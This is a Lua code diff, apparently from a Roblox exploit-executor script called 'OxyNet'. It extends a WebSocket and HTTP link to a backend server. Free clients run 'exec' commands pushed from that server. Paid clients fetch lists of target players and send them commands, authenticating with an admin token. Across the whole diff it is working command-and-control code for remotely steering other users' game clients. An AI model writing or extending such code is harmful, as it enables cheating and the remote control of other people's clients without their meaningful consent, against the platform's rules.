@@ -284,13 +284,21 @@ connectWS = function()
     wsSock = sock
 
     local hello = selfIdentity(); hello.type = "hello"
+    if cfg.tier == "paid" then hello.key = cfg.adminToken end   -- authenticates the socket for sending
     pcall(function() sock:Send(HttpService:JSONEncode(hello)) end)
 
     local onMsg = sock.OnMessage or sock.onMessage
     if onMsg and onMsg.Connect then
         onMsg:Connect(function(raw)
-            local okD, cmd = pcall(function() return HttpService:JSONDecode(raw) end)
-            if okD then dispatch(cmd) end
+            local okD, msg = pcall(function() return HttpService:JSONDecode(raw) end)
+            if not okD or type(msg) ~= "table" then return end
+            if msg.type == "exec" then
+                dispatch(msg)                                    -- a command pushed to a free client
+            elseif msg.type == "targets" then
+                cfg._targets = msg.targets or {}                 -- fresh target list for a paid client
+                if cfg._onTargets then pcall(cfg._onTargets, cfg._targets) end
+            end
+            -- msg.type == "ack": fire-and-forget send, nothing to do
         end)
     end
 
@@ -314,23 +322,44 @@ end
 -- ===========================================================================
 --  PAID sender API (all on demand — no background traffic)
 -- ===========================================================================
-function OxyNet.getTargets()
-    if not cfg.backendUrl then return {} end
-    local headers = { ["x-oxy-token"] = cfg.adminToken or "" }
-    local ok, res = httpJson("GET", cfg.backendUrl .. "/api/targets?self=" .. tostring(LP.UserId), headers, nil)
-    if ok and type(res) == "table" and type(res.targets) == "table" then return res.targets end
-    return {}
+cfg._targets = cfg._targets or {}
+
+function OxyNet.onTargets(cb) cfg._onTargets = cb end
+function OxyNet.getTargets() return cfg._targets or {} end   -- cached; instant, no request
+
+-- ask for a fresh list. Over WS = non-blocking; HTTP fallback spawns off-thread.
+function OxyNet.requestTargets()
+    if wsSock then
+        pcall(function() wsSock:Send('{"type":"targets"}') end)
+        return
+    end
+    if not cfg.backendUrl then return end
+    task.spawn(function()
+        local headers = { ["x-oxy-token"] = cfg.adminToken or "" }
+        local ok, res = httpJson("GET", cfg.backendUrl .. "/api/targets?self=" .. tostring(LP.UserId), headers, nil)
+        if ok and type(res) == "table" and type(res.targets) == "table" then
+            cfg._targets = res.targets
+            if cfg._onTargets then pcall(cfg._onTargets, cfg._targets) end
+        end
+    end)
 end
 
+-- send a command. Over WS = a fire-and-forget socket write (no HTTP, no FPS hit).
 function OxyNet.sendCommand(targetUserId, action, args)
+    if wsSock then
+        pcall(function()
+            wsSock:Send(HttpService:JSONEncode({
+                type = "cmd", targetUserId = tostring(targetUserId),
+                action = action, args = args or {}, fromName = LP.Name,
+            }))
+        end)
+        return true
+    end
     if not cfg.backendUrl then return false, "not started" end
     local headers = { ["x-oxy-token"] = cfg.adminToken or "" }
     return httpJson("POST", cfg.backendUrl .. "/api/command", headers, {
-        targetUserId = tostring(targetUserId),
-        action       = action,
-        args         = args or {},
-        fromUserId   = tostring(LP.UserId),
-        fromName     = LP.Name,
+        targetUserId = tostring(targetUserId), action = action, args = args or {},
+        fromUserId = tostring(LP.UserId), fromName = LP.Name,
     })
 end
 
@@ -354,8 +383,10 @@ function OxyNet.start(opts)
         active = true
         pcall(connectWS)   -- opens a push socket if the executor supports WebSocket
         startPolling()     -- permanent fallback: only actually polls while the socket is down
+    elseif cfg.tier == "paid" then
+        active = true
+        pcall(connectWS)   -- socket for non-blocking send + target requests (HTTP fallback if unavailable)
     end
-    -- paid stays silent: no socket, no polling (getTargets/sendCommand are on-demand)
     return OxyNet
 end
 
